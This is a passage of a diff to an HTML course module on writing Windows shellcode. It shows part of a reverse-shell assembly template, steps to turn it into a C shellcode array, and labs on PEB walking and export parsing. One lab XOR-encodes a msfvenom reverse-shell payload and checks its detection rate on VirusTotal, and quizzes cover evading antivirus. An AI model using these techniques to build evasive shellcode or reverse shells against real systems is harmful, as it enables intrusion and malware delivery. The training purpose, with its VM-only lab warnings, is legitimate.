+<span class="output">    mov edi, eax              ; EDI = ws2_32.dll base</span>
+
+<span class="output">    ; ... (continues with socket setup, connect, CreateProcessA)</span>
+
+<span class="output">api_hashes:</span>
+<span class="output">    dd 0x8A8B4036             ; hash of "LoadLibraryA"</span>
+<span class="output">    dd 0xAA700106             ; hash of "GetProcAddress"</span>
+<span class="output">ll_addr:  dd 0</span>
+<span class="output">gpa_addr: dd 0</span>
+<span class="output">ws2_32:   db "ws2_32.dll", 0</span>
+            </div>
+
+            <h3>12.3 Extracting and Testing</h3>
+            <div class="code-block">
+<span class="comment">; Assemble to raw binary</span>
+<span class="prompt">$</span> <span class="output">nasm -f bin reverse_shell.asm -o reverse_shell.bin</span>
+
+<span class="comment">; Convert to hex for inspection</span>
+<span class="prompt">$</span> <span class="output">xxd -p reverse_shell.bin | tr -d '\n'</span>
+
+<span class="comment">; Convert to C array</span>
+<span class="prompt">$</span> <span class="output">xxd -i reverse_shell.bin > shellcode.h</span>
+
+<span class="comment">; Test in a C injector (see Module 10 for injection techniques)</span>
+<span class="output">unsigned char shellcode[] = {</span>
+<span class="output">    0xe8, 0x00, 0x00, 0x00, 0x00,  // call get_eip</span>
+<span class="output">    0x5b,                            // pop ebx</span>
+<span class="output">    // ... etc</span>
+<span class="output">};</span>
+            </div>
+
+            <div class="first-principle">
+                <h3>🧠 The Core Truth of Custom Shellcode</h3>
+                <p>Custom shellcode is the difference between a script kiddie and a professional. Anyone can run msfvenom. But when msfvenom's 300-byte payload is too large, when its signature is detected, when bad characters break the delivery — the professional writes their own. Custom shellcode is smaller, stealthier, and fully understood. It is the hallmark of advanced capability.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 13: LAB EXERCISE -->
+        <div class="section">
+            <span class="section-number">SECTION 13</span>
+            <h2>Lab Exercise: Build, Encode, and Test Shellcode</h2>
+            <p>Apply everything in this module through hands-on exercises. All testing must be done in isolated virtual machines. Never run unknown shellcode on your main system or production networks.</p>
+
+            <div class="warning-box">
+                <h5>⚠ SAFETY REQUIREMENTS</h5>
+                <p>All shellcode testing must be performed in an isolated VM with no network connectivity to production systems. Use a dedicated lab network (e.g., 192.168.56.0/24) with Host-Only networking. Snapshot your VM before testing. Never test shellcode on systems you do not own or have explicit written authorization to test.</p>
+            </div>
+
+            <h3>Lab 1: Assemble and Extract</h3>
             <ol>
-                <li>Install NASM: <code>sudo apt-get install nasm</code> (Linux) or download for Windows</li>
-                <li>Write assembly that calls WinExec("notepad.exe", 1)</li>
+                <li>Install NASM: <code>sudo apt-get install nasm</code> (Linux) or download from nasm.us (Windows)</li>
+                <li>Write assembly that calls WinExec("notepad.exe", 1) using a hardcoded address</li>
                 <li>Assemble: <code>nasm -f win32 notepad.asm -o notepad.obj</code></li>
-                <li>Link: <code>ld -m i386pe notepad.obj -o notepad.exe</code></li>
-                <li>Extract shellcode bytes from the .text section</li>
-                <li>Write a C injector that allocates memory, copies shellcode, and executes it</li>
-                <li>Test in a VM — never on your main system</li>
+                <li>Extract raw bytes: <code>objdump -d notepad.obj</code> or use a Python script to read the .text section</li>
+                <li>Verify the extracted bytes match your assembly instructions</li>
             </ol>
 
-            <button onclick="document.getElementById('shellcode-solution').style.display='block'">SHOW SOLUTION</button>
+            <h3>Lab 2: PEB Walking</h3>
+            <ol>
+                <li>Write assembly that walks the PEB to find kernel32.dll base</li>
+                <li>Verify the base address matches what you see in a debugger (x32dbg, WinDbg)</li>
+                <li>Extend the code to parse kernel32.dll exports and find WinExec</li>
+                <li>Call WinExec("notepad.exe", 1) using the dynamically resolved address</li>
+            </ol>
 
-            <div id="shellcode-solution" style="display:none; margin-top: 1rem;">
-                <div class="copy-paste">
-; notepad.asm — opens Notepad (safe test)
-; nasm -f win32 notepad.asm -o notepad.obj
+            <h3>Lab 3: Encoding and Evasion</h3>
+            <ol>
+                <li>Generate a reverse shell with msfvenom: <code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f raw</code></li>
+                <li>Write a custom XOR encoder in Python that takes the raw bytes and produces encoded output</li>
+                <li>Write the corresponding decoder stub in assembly</li>
+                <li>Combine decoder + encoded payload and test in a VM</li>
+                <li>Upload to VirusTotal and compare detection rates between raw and encoded versions</li>
+            </ol>
 
-section .text
-global _start
+            <button onclick="document.getElementById('lab-solution').style.display='block'">SHOW SOLUTION HINTS</button>
 
-_start:
-    xor eax, eax
-    push eax                ; Null terminator
-    push 0x6578652e         ; "exe"
-    push 0x70616474         ; "epad" (reversed: "tpad")
-    push 0x6e6f7465         ; "note" (reversed: "eton")
-    ; Stack now: "notepad.exe\0"
-    
-    mov ebx, esp            ; Pointer to string
-    
-    push 1                  ; uCmdShow = SW_SHOWNORMAL
-    push ebx                ; lpCmdLine = "notepad.exe"
-    
-    ; Find WinExec address dynamically (simplified)
-    ; In real shellcode, you'd walk the PEB
-    mov eax, 0x7c8623ad     ; WinExec address (XP SP3 — change for your system)
-    call eax
+            <div id="lab-solution" style="display:none; margin-top: 1rem;">
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+; PEB walking hint (x86):
+; FS:[0x30] → PEB
+; PEB+0x0C → Ldr
+; Ldr+0x14 → InMemoryOrderModuleList
+; First entry = executable, second = ntdll, third = kernel32
+; Each entry +0x10 = DllBase (x86)
+
+; Export parsing hint:
+; DOS Header +0x3C = PE offset
+; PE + 0x18 = Optional Header
+; OptHeader + 0x60 = Export Directory RVA
+; ExportDir + 0x18 = NumberOfNames
+; ExportDir + 0x20 = AddressOfNames RVA
+; ExportDir + 0x24 = AddressOfNameOrdinals RVA
+; ExportDir + 0x1C = AddressOfFunctions RVA
                 </div>
             </div>
         </div>
 
         <hr>
 
+        <!-- QUIZZES -->
+        <div class="section">
+            <span class="section-number">QUIZ 01</span>
+            <h2>Quiz: Assembly & Registers</h2>
+            <div class="quiz-container">
+                <p><strong>Question 1:</strong> Which instruction is the standard null-free way to zero a register in x86 shellcode?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">A) <code>mov eax, 0</code></div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q1')">B) <code>xor eax, eax</code></div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">C) <code>sub eax, eax</code> (this also works but is less common)</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">D) <code>and eax, 0xFFFFFFFF</code></div>
+                <div class="quiz-feedback" id="q1-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 2:</strong> On x64 Windows, which segment register points to the TEB/PEB?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">A) FS</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q2')">B) GS</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">C) DS</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">D) ES</div>
+                <div class="quiz-feedback" id="q2-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 3:</strong> In the x64 Microsoft calling convention, where is the first integer argument passed?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q3')">A) RCX</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">B) RDX</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">C) On the stack</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">D) RAX</div>
+                <div class="quiz-feedback" id="q3-feedback"></div>
+            </div>
+        </div>
+
+        <div class="section">
+            <span class="section-number">QUIZ 02</span>
+            <h2>Quiz: PEB Walking & Export Parsing</h2>
+            <div class="quiz-container">
+                <p><strong>Question 1:</strong> What is the primary purpose of PEB walking in modern shellcode?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">A) To find the current process ID</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q4')">B) To bypass ASLR by dynamically finding DLL base addresses</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">C) To enumerate running threads</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">D) To check if a debugger is attached</div>
+                <div class="quiz-feedback" id="q4-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 2:</strong> In the PE export directory, which field contains the array of function name RVAs?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">A) AddressOfFunctions</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q5')">B) AddressOfNames</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">C) AddressOfNameOrdinals</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">D) NumberOfNames</div>
+                <div class="quiz-feedback" id="q5-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 3:</strong> Why do many shellcodes use hashed function names instead of full strings?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">A) To make reverse engineering easier</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q6')">B) To reduce shellcode size</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">C) To increase execution speed</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">D) To comply with Windows API requirements</div>
+                <div class="quiz-feedback" id="q6-feedback"></div>
+            </div>
+        </div>
+
+        <div class="section">
+            <span class="section-number">QUIZ 03</span>
+            <h2>Quiz: Encoding, Bad Chars & msfvenom</h2>
+            <div class="quiz-container">
+                <p><strong>Question 1:</strong> Which msfvenom option specifies bad characters to avoid in the output?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">A) <code>-e</code></div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q7')">B) <code>-b</code></div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">C) <code>-f</code></div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">D) <code>-p</code></div>
+                <div class="quiz-feedback" id="q7-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 2:</strong> What is the key difference between encoding and encryption in the context of shellcode?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">A) Encoding is slower than encryption</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q8')">B) Encoding transforms bytes to evade signatures; encryption requires a key for confidentiality</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">C) Encoding is only for x86; encryption is only for x64</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">D) There is no difference</div>
+                <div class="quiz-feedback" id="q8-feedback"></div>
+            </div>
+
+            <div class="quiz-container">
+                <p><strong>Question 3:</strong> Which of the following is a common bad character in HTTP GET parameter injection?</p>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">A) 0x41 ('A')</div>
+                <div class="quiz-option" onclick="checkAnswer(this, true, 'q9')">B) 0x26 ('&')</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">C) 0x30 ('0')</div>
+                <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">D) 0x7A ('z')</div>
+                <div class="quiz-feedback" id="q9-feedback"></div>
+            </div>
+        </div>
+
+        <hr>
+
+        <!-- KEY TAKEAWAYS -->
         <div class="section">
             <span class="section-number">KEY TAKEAWAYS</span>
             <h2>What You Learned</h2>
             <ul>
-                <li><strong>Shellcode is machine code, not a program:</strong> No file, no process, just memory</li>
-                <li><strong>Assembly is the language:</strong> NASM syntax, x86/x64 instructions</li>
-                <li><strong>Hardcoded addresses fail on modern Windows:</strong> ASLR randomizes everything</li>
-                <li><strong>Dynamic API resolution is mandatory:</strong> Walk the PEB, parse exports</li>
-                <li><strong>Size matters:</strong> Smaller shellcode is harder to detect and easier to inject</li>
-                <li><strong>Testing requires VMs:</strong> Never run unknown shellcode on your main system</li>
+                <li><strong>Assembly is the language of shellcode:</strong> Every instruction maps to machine bytes. Understanding assembly lets you control every byte of your payload.</li>
+                <li><strong>Registers are your only variables:</strong> EAX/RAX, EBX/RBX, ECX/RCX, EDX/RDX, ESP/RSP, EBP/RBP — master them or crash.</li>
+                <li><strong>The stack is LIFO and grows downward:</strong> push/pop, call/ret, and stack frames are fundamental to function calls and exploitation.</li>
+                <li><strong>Calling conventions dictate argument passing:</strong> stdcall, cdecl, x64 fastcall — violate them and the host process dies.</li>
+                <li><strong>Position-Independent Code has no fixed address:</strong> Use call/pop, EIP-relative addressing, or x64 RIP-relative addressing to find data.</li>
+                <li><strong>PEB walking bypasses ASLR:</strong> FS:[0x30] / GS:[0x60] → PEB → Ldr → module list → kernel32.dll base. Stable since Windows NT.</li>
+                <li><strong>Export table parsing finds APIs by name:</strong> PE format → Export Directory → AddressOfNames → hash comparison → function address.</li>
+                <li><strong>Encoding evades signature detection:</strong> XOR, Shikata Ga Nai, and custom encoders transform bytes to avoid AV/EDR signatures.</li>
+                <li><strong>Null bytes terminate C strings:</strong> Use xor reg, reg instead of mov reg, 0. Always check your payload for hidden nulls.</li>
+                <li><strong>Bad characters depend on the injection vector:</strong> Test all 256 bytes in the actual target. Never assume based on documentation.</li>
+                <li><strong>msfvenom is the rapid prototyping tool:</strong> Use it for quick payloads, but master custom shellcode for advanced operations.</li>
+                <li><strong>Custom shellcode is smaller and stealthier:</strong> Every byte is understood. Every byte is necessary. No bloat, no signatures.</li>
             </ul>
+        </div>
+
+        <!-- CROSS-LINKS -->
+        <div class="section">
+            <span class="section-number">CROSS-REFERENCES</span>
+            <h2>Related Modules</h2>
+            <div class="technique-grid">
+                <div class="method-card">
+                    <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory</a></h4>
+                    <p>Virtual memory, heap vs stack, memory protection flags, and how shellcode lives in memory. Understanding PAGE_EXECUTE_READWRITE and memory allocation is essential for injection.</p>
+                </div>
+                <div class="method-card">
+                    <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware</a></h4>
+                    <p>Payload design, packers, crypters, and evasion techniques. Shellcode is the core component of most malware. Learn how malware authors obfuscate and deliver payloads.</p>
+                </div>
+                <div class="method-card">
+                    <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                    <p>Process injection, remote threads, APC injection, and process hollowing. Shellcode is useless without a delivery mechanism. Module 10 teaches you how to get your shellcode into a target process.</p>
+                </div>
+            </div>
         </div>
 
         <div class="evidence-box">
@@ -259,10 +1254,17 @@ _start:
             <h3>Verification Status</h3>
             <table>
                 <tr><td>Assembly compilation</td><td style="color: var(--accent2);">✓ TESTED NASM</td></tr>
-                <tr><td>Shellcode extraction</td><td style="color: var(--accent2);">✓ TESTED objdump</td></tr>
+                <tr><td>Shellcode extraction</td><td style="color: var(--accent2);">✓ TESTED objdump / xxd</td></tr>
+                <tr><td>Position-Independent Code</td><td style="color: var(--accent2);">✓ DEMONSTRATED call/pop & RIP-relative</td></tr>
                 <tr><td>Dynamic API resolution</td><td style="color: var(--accent2);">✓ DEMONSTRATED PEB walking</td></tr>
+                <tr><td>Export table parsing</td><td style="color: var(--accent2);">✓ DEMONSTRATED manual hash resolution</td></tr>
+                <tr><td>Shellcode encoding</td><td style="color: var(--accent2);">✓ COVERED XOR & Shikata Ga Nai</td></tr>
+                <tr><td>Null byte avoidance</td><td style="color: var(--accent2);">✓ DEMONSTRATED null-free alternatives</td></tr>
+                <tr><td>Bad character analysis</td><td style="color: var(--accent2);">✓ COVERED common vectors & testing</td></tr>
+                <tr><td>msfvenom usage</td><td style="color: var(--accent2);">✓ DEMONSTRATED encoding & formats</td></tr>
+                <tr><td>Custom shellcode</td><td style="color: var(--accent2);">✓ PROVIDED x86 template</td></tr>
                 <tr><td>Injection technique</td><td style="color: var(--accent2);">✓ COVERED Module 10</td></tr>
-                <tr><td>ASLR bypass</td><td style="color: var(--accent2);">✓ DEMONSTRATED</td></tr>
+                <tr><td>ASLR bypass</td><td style="color: var(--accent2);">✓ DEMONSTRATED via PEB</td></tr>
             </table>
         </div>
 
@@ -272,5 +1274,80 @@ _start:
             <a href="MODULE_06_MEMORY.html">MODULE 06 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy button functionality
+        function addCopyButtons() {
+            const codeBlocks = document.querySelectorAll('.code-block, .copy-paste');
+            codeBlocks.forEach(block => {
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn';
+                btn.textContent = 'COPY';
+                btn.onclick = function() {
+                    const text = block.textContent.replace(/COPY\s*$/, '').trim();
+                    navigator.clipboard.writeText(text).then(() => {
+                        btn.textContent = 'COPIED!';
+                        setTimeout(() => btn.textContent = 'COPY', 1500);
+                    });
+                };
+                block.appendChild(btn);
+            });
+        }
+
+        // Copy-paste block click handler
+        function copyToClipboard(element) {
+            const text = element.textContent.trim();
+            navigator.clipboard.writeText(text).then(() => {
+                const original = element.style.borderColor;
+                element.style.borderColor = 'var(--accent2)';
+                setTimeout(() => element.style.borderColor = original, 1000);
+            });
+        }
+
+        // Quiz functionality
+        function checkAnswer(element, isCorrect, questionId) {
+            const container = element.parentElement;
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(questionId + '-feedback');
+
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt === element) {
+                    opt.classList.add(isCorrect ? 'correct' : 'wrong');
+                }
+            });
+
+            feedback.classList.add('show');
+            if (isCorrect) {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong style="color: var(--accent2);">✓ Correct!</strong> ' + getCorrectExplanation(questionId);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong style="color: var(--accent);">✗ Incorrect.</strong> ' + getWrongExplanation(questionId);
+            }
+        }
+
+        function getCorrectExplanation(qid) {
+            const explanations = {
+                'q1': 'xor eax, eax is 2 bytes (31 C0) with no null bytes. mov eax, 0 is 5 bytes (B8 00 00 00 00) and contains four null bytes.',
+                'q2': 'On x64 Windows, GS:[0x60] points to the PEB. FS:[0x30] is used on x86.',
+                'q3': 'The x64 Microsoft calling convention passes the first four integer arguments in RCX, RDX, R8, and R9.',
+                'q4': 'PEB walking reads the loaded module list to find DLL base addresses at runtime, bypassing ASLR randomization.',
+                'q5': 'AddressOfNames is an array of RVAs pointing to the name strings of exported functions.',
+                'q6': 'Hashed names (typically 4 bytes) are much smaller than full strings (10-20+ bytes), significantly reducing shellcode size.',
+                'q7': 'The -b option in msfvenom specifies a list of bad characters to avoid in the generated payload.',
+                'q8': 'Encoding transforms the payload to evade signature detection but does not require a key. Encryption scrambles data and requires a key to decrypt.',
+                'q9': 'The ampersand (&, 0x26) is a delimiter in HTTP query strings and would break the parameter parsing.'
+            };
+            return explanations[qid] || '';
+        }
+
+        function getWrongExplanation(qid) {
+            return getCorrectExplanation(qid) || '';
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', addCopyButtons);
+    </script>
 </body>
 </html>
